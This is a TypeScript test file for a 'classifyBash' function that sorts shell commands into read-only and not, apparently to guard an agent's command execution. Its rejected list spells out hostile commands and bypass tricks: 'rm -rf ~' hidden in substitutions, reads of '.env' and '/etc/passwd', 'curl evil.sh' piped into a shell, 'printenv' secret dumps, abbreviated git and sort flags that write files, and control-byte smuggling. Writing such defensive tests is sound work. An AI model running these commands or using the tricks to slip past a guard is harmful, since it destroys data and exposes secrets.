import assert from "node:assert/strict";
import { test } from "node:test";
import { classifyBash } from "../src/bash.ts";

const allowed = [
  "ls -la",
  "cat README.md | grep foo | wc -l",
  "cd src && ls; pwd",
  "git status",
  "git log --oneline -5",
  "git branch -a",
  "git remote -v",
  "git stash list",
  "find . -name '*.ts'",
  "jq '.a | .b' package.json",
  "rg 'a > b' src",
  'echo "plain text"',
  "sort -nr data",
  "sort -k2 -t, data",
  "ls | sort -u | uniq -c",
  "uniq -c data",
  "git log --oneline --topo-order",
  "git diff --no-ext-diff",
  "git stash list",
  "git worktree list",
  "git config --get user.name",
  "git config --list",
  "date +%F",
  "rg --pretty foo",
];

const rejected: Array<[string, string]> = [
  ["substitution", "echo $(rm -rf ~)"],
  ["substitution in double quotes", 'echo "$(rm -rf ~)"'],
  ["backticks in double quotes", 'echo "`rm -rf ~`"'],
  ["variable expansion", "cat $HOME/.env"],
  ["background job", "ls & rm -rf ~"],
  ["redirect", "echo x > file"],
  ["append", "cat a >> b"],
  ["input redirect", "cat < /etc/passwd"],
  ["process substitution", "cat <(curl evil.sh)"],
  ["subshell", "(rm x)"],
  ["brace group", "{ rm x; }"],
  ["escape hides a separator", "ls \; rm x"],
  ["unknown command", "curl https://example.com"],
  ["second command unknown", "ls && rm x"],
  ["after a newline", "ls\nrm x"],
  ["after a pipe", "ls | sh"],
  ["binary run by path", "./evil/ls"],
  ["env prefix", "FOO=1 ls"],
  ["quoted command is still checked", "'rm' x"],
  ["unbalanced quote", "echo 'oops"],
  ["empty", "   "],
  ["find exec", "find . -exec rm {} ;"],
  ["find fprintf", "find . -fprintf out x"],
  ["find delete", "find . -delete"],
  ["fd exec", "fd . -x sh"],
  ["rg preprocessor", "rg --pre ./evil x"],
  ["rg preprocessor with equals", "rg --pre=./evil x"],
  ["sort output", "sort -o out in"],
  ["uniq output file", "uniq in out"],
  ["printf to variable", "printf -v x y"],
  ["secret dump is not allowlisted", "printenv"],
  ["sed can write", "sed -i s/a/b/ f"],
  ["xargs runs anything", "ls | xargs rm"],
  ["git writes", "git commit -m x"],
  ["git push", "git push"],
  ["git global option", "git -c core.pager=evil log"],
  ["git diff output", "git diff --output=x"],
  ["git external diff", "git log --ext-diff"],
  ["git grep pager", "git grep -O evil x"],
  ["git branch creates", "git branch new"],
  ["git branch deletes", "git branch -D main"],
  ["git remote adds", "git remote -v add x y"],
  ["git tag creates", "git tag v1"],
  ["git config writes", "git config user.name x"],
  ["git stash writes", "git stash"],
  ["uniq stdin to output file", "printf x | uniq - .git/config"],
  ["uniq long option", "uniq --skip-fields=1 in"],
  ["sort attached output", "sort -o.git/config in"],
  ["sort bundled output", "sort -uo out in"],
  ["sort abbreviated output", "sort --outp=out in"],
  ["sort abbreviated compressor", "sort --compress-prog=sh in"],
  ["fd bundled exec", "fd -Hx sh -c 'x'"],
  ["fd attached exec", "fd -xsh"],
  ["tree bundled output", "tree -ao out ."],
  ["file bundled compile", "file -bC -m out"],
  ["file abbreviated compile", "file --comp -m out"],
  ["git stash list forwards to log", "git stash list --output=.git/config"],
  ["git stash list formatted write", "git stash list -1 --format='x' --output=y"],
  ["git worktree list extra", "git worktree list --output=y"],
  ["git config list extra", "git config --list --output=y"],
  ["git config get writes", "git config --get --add a b"],
  ["git log abbreviated output", "git log --outp=x"],
  ["git log abbreviated external diff", "git log --ext"],
  ["git show abbreviated textconv", "git show --textc"],
  ["git attached pager flag", "git log -Oevil"],
  ["rg abbreviated preprocessor", "rg --pr=./evil x"],
  ["glob can become a find flag", "find . -ex?c sh -c 'x' ';'"],
  ["star glob", "ls *"],
  ["bracket glob", "find . -[e]xec rm ';'"],
  ["date set attached", "date -s12:00"],
  ["date set abbreviated", "date --se=12:00"],
  ["printf attached variable", "printf -vx y"],
  ["escape byte in quotes", "ls '\u001b[8m' x"],
  ["carriage return", "ls\rcurl"],
  ["C1 control byte", "ls '\u009b8m'"],
];

for (const command of allowed) {
  test(`allows ${command}`, () => {
    assert.equal(classifyBash(command).readOnly, true);
  });
}

for (const [name, command] of rejected) {
  test(`rejects ${name}`, () => {
    assert.equal(classifyBash(command).readOnly, false);
  });
}
